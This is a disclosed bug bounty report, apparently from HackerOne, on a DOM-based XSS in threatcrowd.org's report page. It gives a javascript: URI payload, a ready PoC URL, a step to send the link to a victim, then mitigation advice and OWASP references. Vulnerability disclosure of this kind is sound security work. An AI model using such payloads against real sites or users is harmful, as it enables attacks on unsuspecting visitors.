@@ -1,0 +1,38 @@
+ReportLink:https://hackerone.com/reports/284484
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/ducnt_
+ReportedTo:AlienVault (alienvault_security)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:02.11.2017 14:48:23
+
+Summary:
+
+Hello AlienVault security team,
+
+**I found a DOM Based XSS in https://threatcrowd.org via report function.**
+
+##Proof of Concept
+**Steps to reproduce:**
+>1. https://threatcrowd.org/report.php?report=
+>2. Fill in with this payload:
+>`javascript:prompt(document.domain)`
+
+>3. Send link to victim, when victim click in to the link **Visit**, *XSS triggered.* It worked in chrome and firefox latest version.
+
+**PoC URL:**
+>`https://threatcrowd.org/report.php?report=javascript:prompt(document.domain)`
+
+**Mitigation:**
+>1. HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context
+>2. Using XSS protection header: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection
+
+**References:**
+>https://www.owasp.org/index.php/DOM_Based_XSS
+>https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+>https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet
+
+**PoC images in attachment.**
+
+*Regards,*
